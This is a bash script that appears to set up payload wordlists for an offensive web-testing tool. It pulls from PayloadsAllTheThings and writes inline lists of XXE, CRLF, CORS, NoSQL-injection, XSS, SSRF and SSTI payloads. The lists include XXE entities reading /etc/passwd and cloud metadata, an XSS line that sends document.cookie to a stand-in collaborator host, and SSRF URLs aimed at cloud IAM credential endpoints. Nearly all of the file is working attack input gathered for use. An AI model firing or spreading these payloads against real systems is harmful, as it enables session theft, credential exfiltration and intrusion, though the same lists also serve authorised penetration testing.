#!/bin/bash
# deploy.sh — Extract PayloadsAllTheThings into per-class payloads.txt
# Run once after cloning PAT. Idempotent.
set -euo pipefail

PAYLOAD_DIR="$(cd "$(dirname "$0")" && pwd)"
PAT_DIR="$PAYLOAD_DIR/../../knowledge/payloads"

log()  { echo -e "\033[0;32m[+]\033[0m $1"; }
warn() { echo -e "\033[1;33m[!]\033[0m $1"; }

# ── SQL Injection ─────────────────────────────────────────────────────────
log "SQLi: combining Intruder payloads..."
SQLI_DIR="$PAT_DIR/SQL Injection/Intruder"
find "$SQLI_DIR" -maxdepth 1 -type f -print0 | xargs -0 cat > "$PAYLOAD_DIR/sqli/payloads.txt" 2>/dev/null
wc -l < "$PAYLOAD_DIR/sqli/payloads.txt" | xargs printf "  %d payloads\n"

# ── Command Injection ─────────────────────────────────────────────────────
log "CMDi: combining Intruder payloads..."
CMDI_DIR="$PAT_DIR/Command Injection/Intruder"
cat "$CMDI_DIR/command_exec.txt" "$CMDI_DIR/command-execution-unix.txt" \
  > "$PAYLOAD_DIR/cmdi/payloads.txt" 2>/dev/null
wc -l < "$PAYLOAD_DIR/cmdi/payloads.txt" | xargs printf "  %d payloads\n"

# ── Open Redirect ─────────────────────────────────────────────────────────
log "Redirect: combining Intruder payloads..."
REDIR_DIR="$PAT_DIR/Open Redirect/Intruder"
cat "$REDIR_DIR/Open-Redirect-payloads.txt" \
    "$REDIR_DIR/openredirects.txt" \
    "$REDIR_DIR/open_redirect_wordlist.txt" \
  > "$PAYLOAD_DIR/redirect/payloads.txt" 2>/dev/null
wc -l < "$PAYLOAD_DIR/redirect/payloads.txt" | xargs printf "  %d payloads\n"

# ── LFI / Path Traversal ──────────────────────────────────────────────────
log "LFI: combining Intruder payloads..."
LFI_DIR="$PAT_DIR/Directory Traversal/Intruder"
cat "$LFI_DIR/deep_traversal.txt" \
    "$LFI_DIR/directory_traversal.txt" \
    "$LFI_DIR/dotdotpwn.txt" \
    "$LFI_DIR/traversals-8-deep-exotic-encoding.txt" \
  > "$PAYLOAD_DIR/lfi/payloads.txt" 2>/dev/null
wc -l < "$PAYLOAD_DIR/lfi/payloads.txt" | xargs printf "  %d payloads\n"

# ── XXE ───────────────────────────────────────────────────────────────────
log "XXE: writing curated payloads..."
cat > "$PAYLOAD_DIR/xxe/payloads.txt" << 'XXE'
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">%eval;%exfil;]>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://COLLABORATOR/">%dtd;%all;]>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service:8080/">]><foo>&xxe;</foo>
<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
XXE
wc -l < "$PAYLOAD_DIR/xxe/payloads.txt" | xargs printf "  %d payloads\n"

# ── CRLF ──────────────────────────────────────────────────────────────────
log "CRLF: writing curated payloads..."
cat > "$PAYLOAD_DIR/crlf/payloads.txt" << 'CRLF'
%0d%0aTest:123
%0d%0aLocation:%20http://evil.com
%0d%0aSet-Cookie:%20session=evil
%0aSet-Cookie:%20session=evil
%0dSet-Cookie:%20session=evil
%0d%0aX-XSS-Protection:%200
%0d%0aContent-Length:%200
%0d%0a%0d%0a<html>test
%E5%98%8D%E5%98%8Ahello
%E5%98%8D%E5%98%8ASet-Cookie:%20session=evil
CRLF
wc -l < "$PAYLOAD_DIR/crlf/payloads.txt" | xargs printf "  %d payloads\n"

# ── CORS ─────────────────────────────────────────────────────────────────
log "CORS: writing test origins..."
cat > "$PAYLOAD_DIR/cors/payloads.txt" << 'CORS'
https://evil.com
null
https://evil.com.evil.com
https://evil.com:8080
https://target.com@evil.com
https://evil.com/
http://evil.com
file://
data://
https:///
CORS
wc -l < "$PAYLOAD_DIR/cors/payloads.txt" | xargs printf "  %d origins\n"

# ── NoSQLi ────────────────────────────────────────────────────────────────
log "NoSQLi: writing curated payloads..."
cat > "$PAYLOAD_DIR/nosqli/payloads.txt" << 'NOSQLI'
' || '1'=='1
' || 1==1 //
' || '1'=='1'%00
{"$gt": ""}
{"$ne": ""}
{"$where": "1==1"}
{"$where": "sleep(5000)"}
admin' || '1'=='1
admin' || 1==1 //
";return true;var foo="
';return true;var foo='
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": []}
{"$or": [{}, {"$where": "1==1"}]}
username[$ne]=admin&password[$ne]=admin
username[$regex]=.*&password[$regex]=.*
username[$ne]=null&password[$ne]=null
NOSQLI
wc -l < "$PAYLOAD_DIR/nosqli/payloads.txt" | xargs printf "  %d payloads\n"

# ── IDOR ─────────────────────────────────────────────────────────────────
log "IDOR: writing ID patterns..."
cat > "$PAYLOAD_DIR/idor/payloads.txt" << 'IDOR'
1
2
3
100
1000
999999
admin
user
test
00000000-0000-0000-0000-000000000000
11111111-1111-1111-1111-111111111111
IDOR
wc -l < "$PAYLOAD_DIR/idor/payloads.txt" | xargs printf "  %d IDs\n"

# ── XSS (no Intruder dir — curated from PAT README) ─────────────────────
log "XSS: writing curated payloads..."
cat > "$PAYLOAD_DIR/xss/payloads.txt" << 'XSS'
<script>alert(document.domain)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script>\u0061lert(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
javascript:alert(1)
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
'><svg/onload=alert(1)>
<IMG SRC=x onerror="alert(1)">
<IMG SRC=javascript:alert(1)>
<IMG SRC=javascript:alert('XSS')>
<IMG """><script>alert(1)</script>
<BODY ONLOAD=alert(1)>
<STYLE>@import url(http://evil.com/xss.css);</STYLE>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)">
<IFRAME SRC=javascript:alert(1)>
<OBJECT DATA="javascript:alert(1)">
<LINK REL="stylesheet" HREF="javascript:alert(1)">
<SCRIPT>location.href="http://COLLABORATOR/?c="+document.cookie</SCRIPT>
XSS
wc -l < "$PAYLOAD_DIR/xss/payloads.txt" | xargs printf "  %d payloads\n"

# ── SSRF (no Intruder dir — curated from PAT README) ────────────────────
log "SSRF: writing curated payloads..."
cat > "$PAYLOAD_DIR/ssrf/payloads.txt" << 'SSRF'
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:5432
http://127.0.0.1:27017
http://127.0.0.1:8080
http://127.0.0.1:8081
http://127.0.0.1:8443
http://127.0.0.1:9000
http://127.0.0.1:9200
http://localhost:80
http://localhost:443
http://0.0.0.0:80
http://0.0.0.0:22
http://[::]:80
http://[::]:22
http://[0000::1]:80
http://[::ffff:127.0.0.1]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
SSRF
wc -l < "$PAYLOAD_DIR/ssrf/payloads.txt" | xargs printf "  %d payloads\n"

# ── SSTI (curated) ──────────────────────────────────────────────────────
log "SSTI: writing test payloads..."
cat > "$PAYLOAD_DIR/ssti/payloads.txt" << 'SSTI'
{{7*7}}
{{7*'7'}}
<%= 7*7 %>
{{config}}
{{self}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__}}
{{''.__class__.__bases__[0].__subclasses__()}}
{$smarty.version}
{{app.request}}
{{dump(app)}}
{{app.user}}
SSTI
wc -l < "$PAYLOAD_DIR/ssti/payloads.txt" | xargs printf "  %d payloads\n"

log "deploy.sh complete — all payloads extracted"
